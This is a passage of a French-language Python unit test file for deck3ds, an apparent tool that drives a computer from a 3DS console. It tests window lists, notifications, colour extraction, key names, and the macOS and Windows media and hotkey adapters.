        await asyncio.sleep(0.2)

    async def test_deconnexion_brutale_toleree(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "hello.ok")

        writer.close()
        await writer.wait_closed()
        await asyncio.sleep(0.4)

        # Le serveur accepte toujours de nouvelles connexions.
        reader2, writer2, frames2 = await self.handshake()
        await self.receive(reader2, frames2, "hello.ok")
        writer2.close()


class TestListLayout(unittest.TestCase):
    """Pages en présentation liste, alimentées par les fenêtres."""

    @staticmethod
    def windows(count: int) -> list[tuple[str, str]]:
        return [(f"App{i}", f"Window {i}") for i in range(count)]

    def test_toutes_les_fenetres_transmises(self):
        """La liste ne se limite pas aux six emplacements d'une grille."""
        from deck3ds.server import _window_entries

        entries = _window_entries(self.windows(15))
        self.assertEqual(len(entries), 15)

    def test_borne_superieure(self):
        from deck3ds.config import MAX_LIST_ENTRIES
        from deck3ds.server import _window_entries

        entries = _window_entries(self.windows(80))
        self.assertEqual(len(entries), MAX_LIST_ENTRIES)

    def test_ordre_preserve(self):
        """L'ordre d'empilement, donc d'usage récent, doit être conservé."""
        from deck3ds.server import _window_entries

        entries = _window_entries(self.windows(5))
        self.assertEqual([e.label for e in entries],
                         [f"App{i}" for i in range(5)])

    def test_element_actif_marque(self):
        from deck3ds.server import _window_entries

        entries = _window_entries(
            [("Safari", "Page"), ("Terminal", "shell")], active_app="Terminal"
        )
        self.assertFalse(entries[0].active)
        self.assertTrue(entries[1].active)

    def test_un_seul_actif(self):
        """Deux fenêtres d'une même application : une seule est marquée."""
        from deck3ds.server import _window_entries

        entries = _window_entries(
            [("Finder", "A"), ("Finder", "B"), ("Finder", "C")],
            active_app="Finder",
        )
        self.assertEqual(sum(1 for e in entries if e.active), 1)
        self.assertTrue(entries[0].active)

    def test_aucun_actif_si_inconnu(self):
        from deck3ds.server import _window_entries

        entries = _window_entries([("Safari", "Page")], active_app="Absente")
        self.assertFalse(any(e.active for e in entries))

    def test_detail_identique_omis(self):
        from deck3ds.server import _window_entries

        entries = _window_entries([("Notes", "Notes")])
        self.assertEqual(entries[0].detail, "")

    def test_detail_tronque(self):
        from deck3ds.config import MAX_DETAIL
        from deck3ds.server import _window_entries

        entries = _window_entries([("App", "T" * 120)])
        self.assertLessEqual(len(entries[0].detail), MAX_DETAIL)

    def test_payload_liste(self):
        raw = minimal_config()
        raw["pages"][0]["layout"] = "list"
        parsed = config_module.parse(raw)

        from deck3ds.server import _window_entries

        parsed.pages[0].entries = _window_entries([("Safari", "Page")])
        payload = parsed.snapshot_payload("en")["pages"][0]

        self.assertEqual(payload["layout"], "list")
        self.assertEqual(len(payload["entries"]), 1)
        self.assertEqual(payload["entries"][0]["label"], "Safari")
        # La console attend toujours le tableau des boutons, même vide.
        self.assertEqual(payload["buttons"], [])

    def test_layout_par_defaut(self):
        parsed = config_module.parse(minimal_config())
        self.assertEqual(parsed.pages[0].layout, "grid")

    def test_layout_inconnu_rejete(self):
        raw = minimal_config()
        raw["pages"][0]["layout"] = "carousel"
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_action_resolue_pour_une_entree(self):
        """L'appui sur un élément doit retrouver son action."""
        raw = minimal_config()
        raw["pages"][0]["layout"] = "list"
        parsed = config_module.parse(raw)

        from deck3ds.server import _window_entries

        parsed.pages[0].entries = _window_entries([("Safari", "Page")])
        action = parsed.find_action("main", "win-0")

        self.assertIsNotNone(action)
        self.assertEqual(action.kind, "window.focus")
        self.assertEqual(action.args["app"], "Safari")

    def test_action_introuvable(self):
        parsed = config_module.parse(minimal_config())
        self.assertIsNone(parsed.find_action("main", "inexistant"))

    def test_icones_valides(self):
        from deck3ds.config import ICONS
        from deck3ds.server import _window_entries

        entries = _window_entries(
            [("Safari", "a"), ("Spotify", "b"), ("Inconnue", "c")]
        )
        for entry in entries:
            self.assertIn(entry.icon, ICONS)
            self.assertRegex(entry.color, r"^#[0-9A-Fa-f]{6}$")


class TestNotifications(unittest.TestCase):
    """Lecture et mise en forme des notifications du système."""

    def reader(self, ignored=None):
        from deck3ds.notifications import NotificationReader

        return NotificationReader(ignored=ignored)

    def test_nom_lisible(self):
        from deck3ds.notifications import _readable_name

        self.assertEqual(_readable_name("com.apple.mobilesms"), "Messages")
        self.assertEqual(_readable_name("com.apple.mail"), "Mail")

    def test_nom_inconnu_derive_du_paquet(self):
        from deck3ds.notifications import _readable_name

        self.assertEqual(_readable_name("com.acme.superapp"), "Superapp")

    def test_prefixe_systeme_retire(self):
        from deck3ds.notifications import _readable_name

        name = _readable_name("_system_center_:com.apple.followup.alert")
        self.assertNotIn("_system_center_", name)

    def test_icone_par_application(self):
        from deck3ds.config import ICONS
        from deck3ds.notifications import _icon_for

        for app in ("Messages", "Musique", "Safari", "Inconnue"):
            self.assertIn(_icon_for(app), ICONS)

    def test_premiere_lecture_ne_signale_rien(self):
        """L'historique ne doit pas être annoncé au démarrage de l'agent."""
        from deck3ds.notifications import Notification

        reader = self.reader()
        items = [
            Notification("Messages", "A", "", "chat", 10, "com.x", "k1")
        ]
        self.assertIsNone(reader.take_new(items))

    def test_nouvelle_notification_signalee_une_fois(self):
        from deck3ds.notifications import Notification

        reader = self.reader()
        first = [Notification("Messages", "A", "", "chat", 10, "com.x", "k1")]
        reader.take_new(first)

        second = [Notification("Messages", "B", "", "chat", 1, "com.x", "k2")]
        self.assertIsNotNone(reader.take_new(second))
        # Le second appel ne doit plus rien signaler.
        self.assertIsNone(reader.take_new(second))

    def test_liste_vide(self):
        self.assertIsNone(self.reader().take_new([]))

    def test_filtrage_par_application(self):
        reader = self.reader(ignored=["Codex"])
        self.assertTrue(reader._is_ignored("Codex", "com.openai.codex"))
        self.assertFalse(reader._is_ignored("Messages", "com.apple.mobilesms"))

    def test_filtrage_insensible_a_la_casse(self):
        reader = self.reader(ignored=["codex"])
        self.assertTrue(reader._is_ignored("Codex", "com.openai.codex"))

    def test_payload(self):
        from deck3ds.platforms.base import NotificationInfo

        payload = NotificationInfo(
            app="Messages", title="Antoine", body="Salut", icon="chat", age=45
        ).as_payload()

        self.assertEqual(payload["app"], "Messages")
        self.assertEqual(payload["age"], 45)
        self.assertEqual(payload["body"], "Salut")

    def test_payload_sans_corps(self):
        from deck3ds.platforms.base import NotificationInfo

        payload = NotificationInfo(app="X", title="Y").as_payload()
        self.assertNotIn("body", payload)

    def test_snapshot_transmet_les_notifications(self):
        from deck3ds.platforms.base import NotificationInfo
        from deck3ds.server import _snapshot_payload

        snapshot = FakePlatform().snapshot()
        snapshot.notifications = [
            NotificationInfo(app=f"App{i}", title=f"T{i}") for i in range(6)
        ]
        payload = _snapshot_payload(snapshot)

        # Quatre suffisent à l'affichage, le total reste indiqué.
        self.assertEqual(len(payload["notifications"]), 4)
        self.assertEqual(payload["notification_count"], 6)

    def test_snapshot_sans_notification(self):
        from deck3ds.server import _snapshot_payload

        payload = _snapshot_payload(FakePlatform().snapshot())
        self.assertNotIn("notifications", payload)
        self.assertNotIn("notification_new", payload)

    def test_nouvelle_notification_transmise(self):
        from deck3ds.platforms.base import NotificationInfo
        from deck3ds.server import _snapshot_payload

        snapshot = FakePlatform().snapshot()
        snapshot.new_notification = NotificationInfo(app="Mail", title="Facture")
        payload = _snapshot_payload(snapshot)

        self.assertEqual(payload["notification_new"]["title"], "Facture")

    def test_base_absente_ne_leve_pas(self):
        """Sur une machine sans cette base, la lecture retourne une liste vide."""
        reader = self.reader()
        reader.available = False
        self.assertEqual(reader.read(), [])

    def test_lecture_cassee_desactive(self):
        reader = self.reader()
        reader.broken = True
        self.assertEqual(reader.read(), [])


class TestPalette(unittest.TestCase):
    """Extraction de la couleur dominante d'une pochette."""

    @staticmethod
    def texture(color: tuple[int, int, int], count: int = 512) -> bytes:
        red, green, blue = color
        value = ((red >> 3) << 11) | ((green >> 2) << 5) | (blue >> 3)
        return bytes([value & 0xFF, value >> 8]) * count

    def test_couleur_saturee_detectee(self):
        from deck3ds import palette

        result = palette.dominant(self.texture((200, 40, 40)))
        self.assertIsNotNone(result)
        # La teinte doit rester rouge dominante après ravivage.
        self.assertGreater(result[0], result[1])
        self.assertGreater(result[0], result[2])

    def test_couleur_sombre_ravivee(self):
        """Une pochette sombre doit produire un accent lisible."""
        from deck3ds import palette

        result = palette.dominant(self.texture((60, 20, 20)))
        self.assertIsNotNone(result)
        self.assertGreaterEqual(max(result), 180)

    def test_gris_rejete(self):
        from deck3ds import palette

        self.assertIsNone(palette.dominant(self.texture((128, 128, 128))))

    def test_noir_et_blanc_rejetes(self):
        from deck3ds import palette

        self.assertIsNone(palette.dominant(self.texture((0, 0, 0))))
        self.assertIsNone(palette.dominant(self.texture((255, 255, 255))))

    def test_texture_vide(self):
        from deck3ds import palette

        self.assertIsNone(palette.dominant(b""))
        self.assertIsNone(palette.dominant(b"\x00"))

    def test_format_hexadecimal(self):
        from deck3ds import palette

        self.assertEqual(palette.to_hex((0x3B, 0x82, 0xF6)), "#3B82F6")


class TestWindowButtons(unittest.TestCase):
    """Génération des boutons de la page des fenêtres."""

    def test_boutons_generes(self):
        from deck3ds.server import _window_buttons

        buttons = _window_buttons([("Safari", "Ma page"), ("Spotify", "Titre")])

        self.assertEqual(len(buttons), 2)
        self.assertEqual(buttons[0].label("en"), "Safari")
        self.assertEqual(buttons[0].icon, "browser")
        self.assertEqual(buttons[0].hold_label("en"), "Ma page")
        self.assertEqual(buttons[0].action.kind, "window.focus")
        self.assertEqual(buttons[0].action.args["app"], "Safari")
        self.assertEqual(buttons[1].icon, "music")

    def test_limite_a_six(self):
        from deck3ds.server import _window_buttons

        windows = [(f"App{index}", f"T{index}") for index in range(20)]
        buttons = _window_buttons(windows)

        self.assertEqual(len(buttons), 6)
        self.assertEqual([button.slot for button in buttons], list(range(6)))

    def test_titre_identique_non_repete(self):
        """Un titre égal au nom de l'application n'apporte rien."""
        from deck3ds.server import _window_buttons

        buttons = _window_buttons([("Notes", "Notes")])
        self.assertEqual(buttons[0].hold_label("en"), "")

    def test_libelles_tronques(self):
        from deck3ds.config import MAX_LABEL
        from deck3ds.server import _window_buttons

        buttons = _window_buttons([("A" * 80, "B" * 80)])
        self.assertLess(len(buttons[0].label("en")), MAX_LABEL)
        self.assertLess(len(buttons[0].hold_label("en")), MAX_LABEL)

    def test_boutons_generes_valides_pour_la_console(self):
        """Les boutons produits doivent respecter les limites du protocole."""
        from deck3ds.config import ICONS, MAX_BUTTONS_PER_PAGE
        from deck3ds.server import _window_buttons

        buttons = _window_buttons([("Finder", "x"), ("Inconnue", "y")])
        for button in buttons:
            self.assertIn(button.icon, ICONS)
            self.assertLess(button.slot, MAX_BUTTONS_PER_PAGE)
            self.assertTrue(button.id)
            self.assertRegex(button.color, r"^#[0-9A-Fa-f]{6}$")

    def test_liste_vide(self):
        from deck3ds.server import _window_buttons

        self.assertEqual(_window_buttons([]), [])

    def test_page_dynamique_peut_utiliser_la_grille(self):
        """La source fenêtres ne doit pas imposer la présentation en liste."""
        raw = minimal_config()
        raw["pages"][0]["source"] = "windows"
        raw["pages"][0]["layout"] = "grid"
        parsed = config_module.parse(raw)
        server = Server(parsed, FakePlatform())

        server._fill_dynamic_pages(
            [("Safari", "Page"), ("Spotify", "Titre")], active_app="Safari"
        )
        payload = server._config_message()["pages"][0]

        self.assertEqual(payload["layout"], "grid")
        self.assertEqual(
            [item["label"] for item in payload["buttons"]],
            ["Safari", "Spotify"],
        )
        self.assertNotIn("entries", payload)


class TestMessages(unittest.TestCase):
    """Traduction des notifications renvoyées à la console."""

    def tearDown(self):
        from deck3ds import messages

        messages.set_language("en")

    def test_anglais_par_defaut(self):
        from deck3ds import messages

        messages.set_language("en")
        self.assertEqual(messages.msg("mic_muted"), "Mic muted")

    def test_francais(self):
        from deck3ds import messages

        messages.set_language("fr")
        self.assertEqual(messages.msg("mic_muted"), "Micro coupé")

    def test_langue_inconnue_retombe_en_anglais(self):
        from deck3ds import messages

        messages.set_language("de")
        self.assertEqual(messages.language(), "en")

    def test_substitution(self):
        from deck3ds import messages

        messages.set_language("en")
        self.assertIn("42", messages.msg("volume_set", value=42))

    def test_cle_absente_ne_leve_pas(self):
        from deck3ds import messages

        self.assertEqual(messages.msg("cle_inexistante"), "cle_inexistante")

    def test_valeur_manquante_ne_leve_pas(self):
        from deck3ds import messages

        # Le gabarit attend `value` : son absence ne doit pas provoquer d'erreur.
        self.assertTrue(messages.msg("volume_set"))

    def test_toutes_les_cles_traduites(self):
        """Chaque clé anglaise doit avoir son équivalent français."""
        from deck3ds.messages import _CATALOGUE

        manquantes = set(_CATALOGUE["en"]) - set(_CATALOGUE["fr"])
        self.assertEqual(manquantes, set(), f"clés sans traduction : {manquantes}")


# --- Noms de touches -----------------------------------------------------------


class TestKeyNames(unittest.TestCase):
    """Régression : « echap » était refusé alors que l'intention était claire.

    L'interface affiche des libellés en français ; un utilisateur francophone
    écrit donc « echap » plutôt que « escape ». L'action échouait avec
    « touche inconnue », sans que rien dans la configuration ne le laisse
    prévoir.
    """

    def test_noms_francais_reconnus(self):
        from deck3ds.platforms.macos import _SPECIAL_KEYS
        from deck3ds.platforms.windows import _SPECIAL_CODES

        for table, plateforme in ((_SPECIAL_KEYS, "macos"), (_SPECIAL_CODES, "windows")):
            for nom in ("echap", "entree", "espace", "tabulation", "suppr",
                        "gauche", "droite", "haut", "bas", "fin"):
                self.assertIn(nom, table, f"{nom} absent de {plateforme}")

    def test_equivalences_coherentes(self):
        """Un nom français doit viser la même touche que son équivalent anglais."""
        from deck3ds.platforms.macos import _SPECIAL_KEYS
        from deck3ds.platforms.windows import _SPECIAL_CODES

        paires = (
            ("echap", "escape"),
            ("entree", "return"),
            ("espace", "space"),
            ("tabulation", "tab"),
            ("suppr", "delete"),
            ("gauche", "left"),
            ("droite", "right"),
            ("haut", "up"),
            ("bas", "down"),
            ("fin", "end"),
        )
        for table in (_SPECIAL_KEYS, _SPECIAL_CODES):
            for francais, anglais in paires:
                self.assertEqual(
                    table[francais], table[anglais],
                    f"{francais} et {anglais} devraient viser la meme touche",
                )

    def test_tables_alignees_entre_plateformes(self):
        """Une touche acceptée sur un système doit l'être sur l'autre.

        Sans quoi une configuration écrite sur macOS échouerait sur Windows,
        ou l'inverse, pour une simple divergence de vocabulaire.
        """
        from deck3ds.platforms.macos import _SPECIAL_KEYS
        from deck3ds.platforms.windows import _SPECIAL_CODES

        # `backspace` et `printscreen` n'ont pas d'équivalent utile sur macOS.
        propres_a_windows = {"backspace", "printscreen"}
        ecart = set(_SPECIAL_CODES) - set(_SPECIAL_KEYS) - propres_a_windows
        self.assertEqual(ecart, set(), f"touches absentes de macOS : {sorted(ecart)}")

        ecart = set(_SPECIAL_KEYS) - set(_SPECIAL_CODES)
        self.assertEqual(ecart, set(), f"touches absentes de Windows : {sorted(ecart)}")


# --- Adaptateur macOS ----------------------------------------------------------


def _mac_platform(player_running=True, **scripts):
    """Instancie `MacPlatform` sans toucher au système.

    `__init__` construit des objets CoreAudio et lit le centre de
    notifications : on l'évite avec `__new__` puis on injecte le strict
    nécessaire. Les scripts AppleScript ne sont jamais exécutés : ils sont
    interceptés et confrontés à un dictionnaire de réponses, dont les clés
    sont des fragments recherchés dans le source du script.

    `player_running` répond au test de présence que `get_media` effectue
    avant d'interroger un lecteur.
    """
    from deck3ds.platforms.macos import MacPlatform

    platform = MacPlatform.__new__(MacPlatform)
    platform._preferred_player = ""
    platform._blocked = set()
    platform._mic_muted = None
    platform._mic_restore = 75
    platform._cpu_count = 4
    platform.scripts = []

    def run_script(source, timeout=None):
        platform.scripts.append(source)
        # Le script porte sa propre garde de présence : un lecteur arrêté
        # renvoie une chaîne vide sans que le reste ne s'exécute. Le simuler
        # fidèlement permet aux tests de détecter la perte de cette garde.
        if "is not running" in source and not player_running:
            return ""
        for fragment, reply in scripts.items():
            if fragment in source:
                if isinstance(reply, BaseException):
                    raise reply
                return reply
        if "is running" in source:
            return "true" if player_running else "false"
        return ""

    def quiet(source, *args):
        # Le vrai `_script_quiet` avale les erreurs et retourne None.
        try:
            return run_script(source)
        except (Unsupported, ActionFailed):
            return None

    platform._script = run_script
    platform._script_quiet = quiet
    return platform


class TestMacMedia(unittest.TestCase):
    """Lecture du média courant sur macOS.

    Ce code n'avait aucun test alors qu'il porte la majeure partie du coût du
    cycle de collecte. Ces tests fixent le comportement observable avant toute
    optimisation, pour qu'une régression soit visible.
    """

    def test_lecteur_arrete_est_ignore(self):
        platform = _mac_platform()  # tout script répond "" -> aucun lecteur actif
        self.assertIsNone(platform.get_media())

    def test_titre_et_artiste_sont_extraits(self):
        platform = _mac_platform(**{
            "player state": "playing\nSuch a Shame\nTalk Talk\nIt's My Life\n\n12,5\n230",
        })
        media = platform.get_media()

        self.assertIsNotNone(media)
        self.assertEqual(media.title, "Such a Shame")
        self.assertEqual(media.artist, "Talk Talk")
        self.assertEqual(media.album, "It's My Life")
        self.assertTrue(media.playing)

    def test_titre_vide_ne_produit_pas_de_media(self):
        """Un lecteur ouvert sans morceau chargé ne doit rien afficher."""
        platform = _mac_platform(**{"player state": "paused\n\n\n\n\n\n"})
        self.assertIsNone(platform.get_media())

    def test_duree_spotify_en_millisecondes_est_convertie(self):
        """Spotify renvoie des millisecondes, Musique des secondes.

        Sans conversion, la console afficherait une durée de plusieurs heures.
        """
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n30\n210000",
        })
        self.assertAlmostEqual(platform.get_media().duration, 210.0)

    def test_duree_en_secondes_est_conservee(self):
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n30\n215",
        })
        self.assertAlmostEqual(platform.get_media().duration, 215.0)

    def test_virgule_decimale_est_acceptee(self):
        """AppleScript suit la locale : la position peut contenir une virgule."""
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n12,5\n215",
        })
        self.assertAlmostEqual(platform.get_media().position, 12.5)

    def test_lecteur_qui_refuse_l_automatisation_est_ecarte(self):
        """Un refus doit être mémorisé, sinon chaque cycle paierait le délai."""
        from deck3ds.platforms.macos import MEDIA_PLAYERS

        platform = _mac_platform(**{"player state": ActionFailed("refus")})
        self.assertIsNone(platform.get_media())
        self.assertTrue(platform._blocked)
        for player in platform._blocked:
            self.assertIn(player, MEDIA_PLAYERS)

    def test_lecteur_actif_devient_prioritaire(self):
        """Mémoriser le lecteur trouvé évite de sonder l'autre au cycle suivant."""
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2",
        })
        media = platform.get_media()
        self.assertEqual(platform._preferred_player, media.app)

    def test_script_garde_le_test_de_presence(self):
        """Sans garde, `tell application` LANCE le lecteur au lieu de l'interroger.

        Vérifié sur macOS : un `tell` visant une application fermée la démarre.
        La collecte s'exécutant chaque seconde, sa perte ouvrirait Spotify tout
        seul. La garde doit donc précéder le `tell` dans le script.
        """
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n40",
        })
        platform.get_media()

        script = platform.scripts[0]
        self.assertIn("is not running", script)
        self.assertLess(
            script.index("is not running"),
            script.index("tell application"),
            "la garde doit précéder le tell, sinon le lecteur est démarré",
        )

    def test_un_seul_appel_applescript_par_lecteur(self):
        """Lancer `osascript` coûte ~170 ms quelle que soit la taille du script.

        Le test de présence, l'état du morceau et le volume du lecteur doivent
        donc tenir dans une seule requête. Ce test échouera si un appel
        supplémentaire est réintroduit, ce qui dégraderait la collecte.
        """
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n40",
        })
        platform.get_media()
        self.assertEqual(len(platform.scripts), 1, platform.scripts)

    def test_volume_du_lecteur_est_releve_au_passage(self):
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n40",
        })
        platform.get_media()
        self.assertEqual(platform._player_volume, 40)

    def test_volume_absent_reste_indetermine(self):
        """Musique n'expose pas `sound volume` : zéro serait un mensonge."""
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n",
        })
        platform.get_media()
        self.assertIsNone(platform._player_volume)

    def test_volume_du_lecteur_reste_dans_les_bornes(self):
        """La console attend un pourcentage : une valeur hors bornes la casserait."""
        platform = _mac_platform(**{
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n250",
        })
        platform.get_media()
        self.assertEqual(platform._player_volume, 100)

    def test_volume_memorise_est_oublie_sans_lecteur(self):
        """Une valeur périmée afficherait un volume qui n'existe plus."""
        platform = _mac_platform(player_running=False)
        platform._player_volume = 40
        self.assertIsNone(platform.get_media())
        self.assertIsNone(platform._player_volume)


class TestMacSnapshot(unittest.TestCase):
    """Collecte groupée : c'est le chemin exécuté à chaque seconde."""

    def _snapshot(self, platform):
        platform._audio = type("A", (), {"outputs": staticmethod(lambda: [])})()
        platform._notifications = type(
            "N", (), {"read": staticmethod(lambda: []),
                      "take_new": staticmethod(lambda entries: None)}
        )()
        platform._pending_notification = None
        platform.get_cpu = lambda: None
        platform.get_memory = lambda: None
        return platform.snapshot()

    def test_champs_groupes_sont_repartis(self):
        platform = _mac_platform(**{
            "get volume settings": "42|false|60|Safari|Safari,Dock,Finder",
        })
        snapshot = self._snapshot(platform)

        self.assertEqual(snapshot.volume, 42)
        self.assertFalse(snapshot.muted)
        self.assertFalse(snapshot.mic_muted)
        self.assertEqual(snapshot.active_app, "Safari")

    def test_processus_techniques_sont_masques(self):
        """`Dock` ou `SystemUIServer` ne sont pas des applications utiles."""
        platform = _mac_platform(**{
            "get volume settings":
                "10|false|50|Safari|Safari,Dock,SystemUIServer,FolderActionsDispatcher,Notes",
        })
        snapshot = self._snapshot(platform)
        self.assertEqual(snapshot.apps, ["Safari", "Notes"])

    def test_micro_a_zero_est_signale_coupe(self):
        platform = _mac_platform(**{
            "get volume settings": "10|false|0|Safari|Safari",
        })
        self.assertTrue(self._snapshot(platform).mic_muted)

    def test_micro_illisible_retombe_sur_l_etat_suivi(self):
        """Retourner une valeur inventée afficherait un état faux sur la console."""
        platform = _mac_platform(**{
            "get volume settings": "10|false|inconnu|Safari|Safari",
        })
        platform._mic_muted = True
        self.assertTrue(self._snapshot(platform).mic_muted)

    def test_volume_hors_bornes_est_ramene_dans_l_intervalle(self):
        platform = _mac_platform(**{
            "get volume settings": "250|false|50|Safari|Safari",
        })
        self.assertLessEqual(self._snapshot(platform).volume, 100)

    def test_volume_du_lecteur_est_reutilise_sans_appel_supplementaire(self):
        """`get_media` a déjà relevé le volume : le redemander coûtait ~100 ms."""
        platform = _mac_platform(**{
            "get volume settings": "10|false|50|Spotify|Spotify",
            "player state": "playing\nTitre\nArtiste\nAlbum\n\n1\n2\n35",
        })
        snapshot = self._snapshot(platform)

        self.assertEqual(snapshot.app_volume, 35)
        # Deux scripts au maximum : la collecte groupée et le lecteur.
        self.assertLessEqual(len(platform.scripts), 2, platform.scripts)

    def test_list_apps_masque_aussi_les_processus_techniques(self):
        """`list_apps` filtre la même liste que `snapshot`.

        Les deux chemins doivent produire le même résultat, sinon le repli
        afficherait des processus que la collecte groupée masque.
        """
        platform = _mac_platform(**{
            "background only": "Safari, Dock, SystemUIServer, Notes",
        })
        self.assertEqual(platform.list_apps(), ["Safari", "Notes"])


class TestMacHotkey(unittest.TestCase):
    """Raccourcis clavier : la traduction vers AppleScript doit rester stable."""

    def test_touche_speciale_utilise_son_code(self):
        platform = _mac_platform()
        platform.send_hotkey("echap")
        self.assertIn("key code 53", platform.scripts[-1])

    def test_modificateurs_sont_traduits(self):
        platform = _mac_platform()
        platform.send_hotkey("cmd+shift+4")
        script = platform.scripts[-1]
        self.assertIn("command down", script)
        self.assertIn("shift down", script)

    def test_guillemet_est_echappe(self):
        """Un caractère non échappé casserait le script AppleScript."""
        platform = _mac_platform()
        platform.send_hotkey('"')
        self.assertIn('\\"', platform.scripts[-1])

    def test_combinaison_vide_refusee(self):
        platform = _mac_platform()
        with self.assertRaises(ActionFailed):
            platform.send_hotkey("")

    def test_touche_inconnue_refusee(self):
        platform = _mac_platform()
        with self.assertRaises(ActionFailed):
            platform.send_hotkey("touche-qui-nexiste-pas")


# --- Capacités de plateforme ---------------------------------------------------


class TestCapabilities(unittest.TestCase):
    """L'interface s'appuie sur ces déclarations pour avertir l'utilisateur."""

    def test_plateforme_generique_sans_capacite(self):
        """Une plateforme sans adaptateur ne doit rien promettre."""
        capabilities = Platform().capabilities()
        self.assertFalse(any(capabilities.as_payload().values()))

    def test_chaque_action_connue_a_une_capacite_ou_est_locale(self):
        """Toute action doit être classée, pour ne pas échapper à l'avertissement.

        Une action ni associée à une capacité ni traitée par la console serait
        supposée disponible partout, et l'interface la proposerait à tort.
        """
        locales = {
            "noop",
            "page.open",
            "settings.open",
            "modal.volumes",
            "frame.toggle",
            "script.run",
        }
        non_classees = (
            config_module.KNOWN_ACTIONS
            - set(config_module.ACTION_CAPABILITY)
            - locales
        )
        self.assertEqual(
            non_classees,
            set(),
            f"actions sans capacite declaree : {sorted(non_classees)}",
        )

    def test_capacites_referencent_des_champs_existants(self):
        """Une faute de frappe rendrait l'avertissement inopérant en silence."""
        from deck3ds.platforms.base import Capabilities, fields_of

        connus = set(fields_of(Capabilities()))
        for table in (
            config_module.ACTION_CAPABILITY,
            config_module.DASHBOARD_CAPABILITY,
        ):
            for key, capability in table.items():
                self.assertIn(capability, connus, f"{key} -> {capability}")

    def test_windows_declare_ses_manques(self):
        """L'adaptateur Windows doit avouer ce qu'il n'implémente pas.

        Ce test échouera lorsque ces fonctions seront portées : il faudra alors
        mettre à jour la déclaration, ce qui est précisément le but.
        """
        from deck3ds.platforms.windows import WindowsPlatform

        capabilities = WindowsPlatform.capabilities(None)
        self.assertTrue(capabilities.windows)
        self.assertTrue(capabilities.audio_output)
        self.assertFalse(capabilities.app_volume)
        self.assertFalse(capabilities.notifications)
        self.assertTrue(capabilities.media_artwork)
        # Ce qui fonctionne doit rester déclaré.
        self.assertTrue(capabilities.volume)
        self.assertTrue(capabilities.media)


class TestWindowsAdapter(unittest.TestCase):
    """Comportements Windows testables sans appeler l'OS hôte."""

    def test_focus_fenetre_filtre_application_et_titre(self):
        from deck3ds.platforms.windows import WindowsPlatform

        class User32:
            def __init__(self):
                self.focused = None

            def ShowWindow(self, handle, _mode):
                self.focused = handle
                return True

            def SetForegroundWindow(self, handle):
                self.focused = handle
                return True

        platform = WindowsPlatform.__new__(WindowsPlatform)
        platform._user32 = User32()
        platform._window_records = lambda: [
            (10, "chrome", "Documentation"),
            (20, "Notepad", "Notes de test"),
        ]

        label = platform.focus_window("notepad.exe", "Notes")

        self.assertEqual(label, "Notes de test")
        self.assertEqual(platform._user32.focused, 20)

    def test_focus_fenetre_absente_est_explicite(self):
        from deck3ds.platforms.windows import WindowsPlatform

        platform = WindowsPlatform.__new__(WindowsPlatform)
        platform._window_records = lambda: []
        with self.assertRaises(ActionFailed):
            platform.focus_window("absente", "")

    def test_alias_safari_ouvre_le_navigateur(self):
        from deck3ds.platforms.windows import WindowsPlatform

        platform = WindowsPlatform.__new__(WindowsPlatform)
        calls = []
        platform.spawn = calls.append

        platform.launch_app("Safari")

        self.assertIn("https://", calls[0][-1])

    def test_capture_macos_devient_capture_windows(self):
        from deck3ds.platforms.windows import WindowsPlatform

        class User32:
            def __init__(self):
                self.events = []

            def keybd_event(self, code, _scan, flags, _extra):
                self.events.append((code, flags))

        platform = WindowsPlatform.__new__(WindowsPlatform)
        platform._user32 = User32()

        platform.send_hotkey("cmd+shift+4")

        pressed = [code for code, flags in platform._user32.events if flags == 0]
        self.assertEqual(pressed, [0x5B, 0x10, ord("S")])

    def test_scripts_powershell_sont_syntaxiquement_equilibres(self):
        """Windows n'est pas testable ici : ces invariants tiennent lieu de garde.

        Un déséquilibre d'accolades ou de parenthèses dans le C# embarqué ne se
        verrait qu'à l'exécution sur la console d'un utilisateur.
        """
        from deck3ds.platforms.windows import WindowsPlatform

        platform = WindowsPlatform.__new__(WindowsPlatform)
        for script in (
            platform._audio_script("$corps"),
            platform._device_script("$corps"),
        ):
            self.assertEqual(script.count("{"), script.count("}"), script[:80])
            self.assertEqual(script.count("("), script.count(")"), script[:80])
            # Le here-string C# doit être ouvert et refermé.
            self.assertEqual(script.count("@'\n"), script.count("\n'@"))
            self.assertTrue(script.rstrip().endswith("$corps"))

    def test_helper_asynchrone_est_defini_avant_ses_appels(self):
        """PowerShell exige que la fonction précède son premier appel.

        Le motif `AsTask` était recopié trois fois ; il est désormais factorisé.
        Ce test vérifie que la factorisation reste correcte.
        """
        import re

        from deck3ds.platforms.windows import WindowsPlatform

        source = inspect.getsource(WindowsPlatform.get_media)
        script = eval(re.search(r"script = (r'''.*?''')", source, re.S).group(1))
        lines = script.strip().splitlines()

        definition = next(
            index
            for index, line in enumerate(lines)
            if line.startswith("function Wait-Deck3DSAsync")
        )
        calls = [
            index
            for index, line in enumerate(lines)
            if "Wait-Deck3DSAsync " in line and not line.startswith("function")
        ]

        self.assertEqual(len(calls), 3, "les trois attentes WinRT doivent subsister")
        for call in calls:
            self.assertGreater(call, definition)
            # En mode commande, un appel de méthode passé en argument doit être
            # parenthésé, sinon PowerShell le traite comme une chaîne.
            self.assertRegex(lines[call], r"Wait-Deck3DSAsync \(")

    def test_script_media_conserve_les_champs_attendus(self):
        """Le serveur lit ces clés : en perdre une viderait l'affichage."""
        import re

        from deck3ds.platforms.windows import WindowsPlatform

        source = inspect.getsource(WindowsPlatform.get_media)
        script = eval(re.search(r"script = (r'''.*?''')", source, re.S).group(1))

        for field in (
            "title", "artist", "album", "app", "playing",
            "position", "duration", "key", "art",
        ):
            self.assertIn(f"{field}=", script)
        # Les trois types WinRT spécialisés restent nécessaires.
